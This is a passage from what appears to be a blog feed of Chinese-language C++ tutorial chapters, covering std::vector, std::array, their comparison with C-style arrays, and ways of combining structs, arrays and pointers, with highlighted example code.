class="string">&quot;Tasks:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; tasks.size(); ++i) &#123; <span class="comment">// 使用 size_t 作为索引类型</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; tasks[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Tasks: Read Write Code</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移除末尾元素</span></span><br><span class="line">    numbers.pop_back(); <span class="comment">// numbers: &#123;15, 20&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Last number after pop: &quot;</span> &lt;&lt; numbers.back() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// back() 访问最后一个元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::vector</code> 是 C++ 中替代动态数组的首选方案，因为它更安全、更易于管理。</p><h2 id="4-10-2-模板类array（C-11）"><a href="#4-10-2-模板类array（C-11）" class="headerlink" title="4.10.2 模板类array（C++11）"></a>4.10.2 模板类array（C++11）</h2><p>C++11 引入了 <code>std::array</code> 模板类，它封装了<strong>固定大小</strong>的数组。与 C 风格数组类似，其大小在编译时确定，但它提供了更现代的接口和一些 <code>vector</code> 具有的便利性（如 <code>size()</code>, <code>at()</code>）。</p><p><strong>特点:</strong></p><ul><li>  <strong>固定大小:</strong> 数组大小必须在编译时指定为模板参数，之后不能改变。</li><li>  <strong>内存位置:</strong> 通常在栈上分配内存（如果作为局部变量声明），与 C 风格数组类似，除非显式使用 <code>new</code> 创建。</li><li>  <strong>类型安全:</strong> 大小是类型的一部分 (<code>std::array&lt;int, 5&gt;</code> 和 <code>std::array&lt;int, 10&gt;</code> 是不同的类型)。</li><li>  <strong>STL 接口:</strong> 提供与 <code>vector</code> 类似的接口，如 <code>size()</code>, <code>empty()</code>, <code>at()</code>, <code>[]</code>, <code>front()</code>, <code>back()</code>，以及迭代器支持，可以方便地与 STL 算法一起使用。</li><li>  <strong>无开销抽象:</strong> 通常不会比 C 风格数组带来额外的运行时性能开销。</li><li>  <strong>模板类:</strong> 需要指定元素类型和大小，例如 <code>std::array&lt;int, 10&gt;</code>, <code>std::array&lt;double, 3&gt;</code>。</li></ul><p><strong>使用方法:</strong></p><ol><li> <strong>包含头文件:</strong> <code>#include &lt;array&gt;</code></li><li><strong>声明和初始化:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 5&gt; scores; <span class="comment">// 创建包含 5 个 int 的 array (元素值未定义，除非是静态存储)</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, 3&gt; coords &#123;&#125;; <span class="comment">// 创建包含 3 个 double 的 array, 零初始化 &#123;0.0, 0.0, 0.0&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 列表初始化</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 4&gt; values &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;; <span class="comment">// 创建并初始化</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, 2&gt; names &#123;<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意: 初始化列表的元素数量不能超过 array 的大小</span></span><br><span class="line"><span class="comment">// std::array&lt;int, 3&gt; errors &#123;1, 2, 3, 4&#125;; // 错误!</span></span><br><span class="line"><span class="comment">// 如果元素数量少于 array 大小，剩余元素会被值初始化 (通常为 0)</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 5&gt; partial &#123;<span class="number">10</span>, <span class="number">20</span>&#125;; <span class="comment">// &#123;10, 20, 0, 0, 0&#125;</span></span><br></pre></td></tr></table></figure></li><li><strong>访问元素:</strong><ul><li>  <code>[]</code> 运算符: <code>scores[0]</code>, <code>names[i]</code> (不进行边界检查)。</li><li>  <code>at()</code> 函数: <code>scores.at(0)</code>, <code>names.at(i)</code> (进行边界检查，越界抛出 <code>std::out_of_range</code> 异常)。</li></ul></li><li><strong>常用操作:</strong><ul><li>  <code>size()</code>: 返回数组的大小（编译时常量）。</li><li>  <code>empty()</code>: 检查数组是否为空（对于大小 &gt; 0 的 <code>std::array</code> 总是返回 <code>false</code>）。</li><li>  <code>fill(value)</code>: 将所有元素设置为指定值。</li><li>  <code>front()</code>: 访问第一个元素。</li><li>  <code>back()</code>: 访问最后一个元素。</li></ul></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; // 为了 std::accumulate</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建和初始化</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 5&gt; data &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, 3&gt; colors &#123;<span class="string">&quot;Red&quot;</span>, <span class="string">&quot;Green&quot;</span>, <span class="string">&quot;Blue&quot;</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, 4&gt; temps &#123;&#125;; <span class="comment">// &#123;0.0, 0.0, 0.0, 0.0&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问元素</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First data element: &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Second color: &quot;</span> &lt;&lt; colors.at(<span class="number">1</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Green</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A temperature: &quot;</span> &lt;&lt; temps[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取大小</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of data array: &quot;</span> &lt;&lt; data.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 填充</span></span><br><span class="line">    temps.fill(<span class="number">25.5</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Filled temperature: &quot;</span> &lt;&lt; temps[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 25.5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历 (C++11 基于范围的 for 循环)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Colors:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; color : colors) &#123; <span class="comment">// 使用 const 引用避免复制</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; color;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Colors: Red Green Blue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 与 STL 算法一起使用</span></span><br><span class="line">    <span class="keyword">double</span> sum = <span class="built_in">std</span>::accumulate(temps.begin(), temps.end(), <span class="number">0.0</span>); <span class="comment">// 计算总和</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of temperatures: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::array</code> 是替代需要固定大小数组的 C 风格数组的现代 C++ 方案。</p><h2 id="4-10-3-比较数组、vector对象和array对象"><a href="#4-10-3-比较数组、vector对象和array对象" class="headerlink" title="4.10.3 比较数组、vector对象和array对象"></a>4.10.3 比较数组、vector对象和array对象</h2><table><thead><tr><th align="left">特性</th><th align="left">C 风格数组 (<code>T[]</code>)</th><th align="left"><code>std::vector&lt;T&gt;</code></th><th align="left"><code>std::array&lt;T, N&gt;</code> (C++11)</th></tr></thead><tbody><tr><td align="left"><strong>大小</strong></td><td align="left">固定 (编译时确定栈数组，运行时确定堆数组)</td><td align="left">动态 (可运行时改变)</td><td align="left">固定 (编译时确定)</td></tr><tr><td align="left"><strong>内存分配</strong></td><td align="left">栈 (局部) 或 静态区 或 堆 (<code>new[]</code>)</td><td align="left">通常在堆上 (自由存储区)</td><td align="left">通常在栈上 (除非用 <code>new</code> 创建)</td></tr><tr><td align="left"><strong>大小信息</strong></td><td align="left">无内置方法获取大小 (需单独传递)</td><td align="left"><code>size()</code> 成员函数</td><td align="left"><code>size()</code> 成员函数 (编译时常量)</td></tr><tr><td align="left"><strong>边界检查</strong></td><td align="left">无 (不安全)</td><td align="left"><code>at()</code> 提供检查, <code>[]</code> 不提供</td><td align="left"><code>at()</code> 提供检查, <code>[]</code> 不提供</td></tr><tr><td align="left"><strong>赋值/复制</strong></td><td align="left">不能直接赋值/复制整个数组</td><td align="left">可以直接赋值/复制 (深拷贝)</td><td align="left">可以直接赋值/复制 (成员逐一复制)</td></tr><tr><td align="left"><strong>作为函数参数</strong></td><td align="left">通常退化为指针 (丢失大小信息)</td><td align="left">可以按值、引用或指针传递</td><td align="left">可以按值、引用或指针传递</td></tr><tr><td align="left"><strong>STL 兼容性</strong></td><td align="left">有限 (需要指针和大小)</td><td align="left">完全兼容 (提供迭代器等)</td><td align="left">完全兼容 (提供迭代器等)</td></tr><tr><td align="left"><strong>性能</strong></td><td align="left">通常最快 (直接内存访问)</td><td align="left">访问速度快，添加/删除可能涉及内存重分配</td><td align="left">通常与 C 风格数组性能相同</td></tr><tr><td align="left"><strong>头文件</strong></td><td align="left">无需</td><td align="left"><code>&lt;vector&gt;</code></td><td align="left"><code>&lt;array&gt;</code></td></tr></tbody></table><p><strong>选择建议:</strong></p><ul><li>  <strong>需要动态大小:</strong> 如果数组大小在运行时才能确定，或者需要在程序运行期间改变大小，**<code>std::vector</code> 是最佳选择**。</li><li><strong>需要固定大小 (编译时已知):</strong> 如果数组大小在编译时就确定且不会改变：<ul><li>  **优先选择 <code>std::array</code> (C++11 及以后)**。它提供了与 C 风格数组相同的性能和内存布局（通常在栈上），但具有更安全、更方便的接口（如 <code>size()</code>, <code>at()</code>, 迭代器）。</li><li>  如果不能使用 C++11 或有特定 C 接口兼容性需求，可以使用 C 风格数组，但要特别注意安全性和大小管理。</li></ul></li><li>  <strong>性能关键且大小固定:</strong> <code>std::array</code> 和 C 风格数组通常性能最佳。</li></ul><p>总的来说，在现代 C++ 中，应优先使用 <code>std::vector</code> 和 <code>std::array</code> 而不是 C 风格数组，以获得更好的类型安全、内存管理和易用性。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.9 类型组合</title>
      <link href="2025/04/26/4.9_%E7%B1%BB%E5%9E%8B%E7%BB%84%E5%90%88/"/>
      <url>2025/04/26/4.9_%E7%B1%BB%E5%9E%8B%E7%BB%84%E5%90%88/</url>
      
        <content type="html"><![CDATA[<p>C++ 的强大之处在于其类型系统允许你将基本类型、复合类型（数组、结构、共用体、枚举）和指针以多种方式组合起来，创建更复杂的数据结构来精确地模拟现实世界的问题。</p><p>本章我们已经接触了一些组合：</p><ul><li>  <strong>结构数组 (Array of Structures):</strong> 数组的每个元素都是一个结构体 (见 4.4.5)。</li><li>  <strong>结构包含 <code>std::string</code> 成员:</strong> 结构体可以包含类类型的成员 (见 4.4.3)。</li><li>  <strong>指针指向结构:</strong> 可以声明指向结构体对象的指针 (见 4.8.4)。</li><li>  <strong>指针指向数组 (或数组名视为指针):</strong> 指针可以用来操作数组 (见 4.8.1)。</li></ul><p>本节将进一步探讨一些常见的类型组合方式。</p><p><strong>1. 结构包含数组成员:</strong></p><p>结构体可以包含数组作为其成员。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StudentGrades</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> studentName;</span><br><span class="line">    <span class="keyword">int</span> grades[<span class="number">5</span>]; <span class="comment">// 包含一个 int 数组作为成员</span></span><br><span class="line">    <span class="keyword">int</span> numGrades; <span class="comment">// 记录实际存储的成绩数量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StudentGrades alice;</span><br><span class="line">    alice.studentName = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    alice.grades[<span class="number">0</span>] = <span class="number">95</span>;</span><br><span class="line">    alice.grades[<span class="number">1</span>] = <span class="number">88</span>;</span><br><span class="line">    alice.grades[<span class="number">2</span>] = <span class="number">92</span>;</span><br><span class="line">    alice.numGrades = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; alice.studentName &lt;&lt; <span class="string">&quot;&#x27;s first grade: &quot;</span> &lt;&lt; alice.grades[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; alice.numGrades; ++i) &#123;</span><br><span class="line">        sum += alice.grades[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (alice.numGrades &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average grade: &quot;</span> &lt;&lt; sum / alice.numGrades &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2. 结构包含指针成员:</strong></p><p>结构体可以包含指针作为成员。这常用于指向动态分配的内存或指向其他数据结构。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DynamicData</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> label;</span><br><span class="line">    <span class="keyword">int</span>* data_ptr; <span class="comment">// 指向动态分配的 int 数组</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DynamicData myData;</span><br><span class="line">    myData.label = <span class="string">&quot;Sensor Readings&quot;</span>;</span><br><span class="line">    myData.size = <span class="number">10</span>;</span><br><span class="line">    myData.data_ptr = <span class="keyword">new</span> <span class="keyword">int</span>[myData.size]; <span class="comment">// 动态分配内存</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化动态数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; myData.size; ++i) &#123;</span><br><span class="line">        myData.data_ptr[i] = i * i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Label: &quot;</span> &lt;&lt; myData.label &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data at index 3: &quot;</span> &lt;&lt; myData.data_ptr[<span class="number">3</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 9</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// **重要:** 必须手动释放指针成员指向的动态内存</span></span><br><span class="line">    <span class="keyword">delete</span> [] myData.data_ptr; </span><br><span class="line">    myData.data_ptr = <span class="literal">nullptr</span>; <span class="comment">// 避免悬挂指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 当结构包含指针成员指向动态内存时，需要特别注意内存管理（复制、赋值、析构），这通常涉及到类的特殊成员函数（拷贝构造函数、拷贝赋值运算符、析构函数），我们将在后续章节深入学习。</p><p><strong>3. 指针数组 (Array of Pointers):</strong></p><p>可以创建数组，其每个元素都是一个指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>, c = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">int</span>* ptr_array[<span class="number">3</span>]; <span class="comment">// 声明一个包含 3 个 int* 指针的数组</span></span><br><span class="line"></span><br><span class="line">    ptr_array[<span class="number">0</span>] = &amp;a; <span class="comment">// 第一个元素指向 a</span></span><br><span class="line">    ptr_array[<span class="number">1</span>] = &amp;b; <span class="comment">// 第二个元素指向 b</span></span><br><span class="line">    ptr_array[<span class="number">2</span>] = &amp;c; <span class="comment">// 第三个元素指向 c</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Values via pointer array:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Value at *ptr_array[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;]: &quot;</span> &lt;&lt; *ptr_array[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以指向动态分配的内存</span></span><br><span class="line">    <span class="keyword">int</span>* dyn_ptr_array[<span class="number">2</span>];</span><br><span class="line">    dyn_ptr_array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">100</span>);</span><br><span class="line">    dyn_ptr_array[<span class="number">1</span>] = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDynamic values:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *dyn_ptr_array[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *dyn_ptr_array[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放动态内存</span></span><br><span class="line">    <span class="keyword">delete</span> dyn_ptr_array[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">delete</span> dyn_ptr_array[<span class="number">1</span>];</span><br><span class="line">    dyn_ptr_array[<span class="number">0</span>] = <span class="literal">nullptr</span>;</span><br><span class="line">    dyn_ptr_array[<span class="number">1</span>] = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指针数组常用于存储 C 风格字符串数组（<code>const char*[]</code>）或管理一组动态分配的对象。</p><p><strong>4. 指向指针的指针 (Pointer to Pointer):</strong></p><p>指针本身也是变量，它也有自己的内存地址。因此，可以声明一个指向指针的指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">42</span>;</span><br><span class="line">    <span class="keyword">int</span> *ptr = &amp;value;      <span class="comment">// ptr 指向 value (int*)</span></span><br><span class="line">    <span class="keyword">int</span> **pptr = &amp;ptr;      <span class="comment">// pptr 指向 ptr (int**)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;             <span class="comment">// 42</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of value (&amp;value): &quot;</span> &lt;&lt; &amp;value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of ptr (address of value): &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// value 的地址</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via ptr (*ptr): &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;           <span class="comment">// 42</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of ptr (&amp;ptr): &quot;</span> &lt;&lt; &amp;ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of pptr (address of ptr): &quot;</span> &lt;&lt; pptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ptr 的地址</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via pptr (*pptr): &quot;</span> &lt;&lt; *pptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// ptr 的值 (即 value 的地址)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via pptr (**pptr): &quot;</span> &lt;&lt; **pptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// value 的值 (42)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改值</span></span><br><span class="line">    **pptr = <span class="number">50</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> 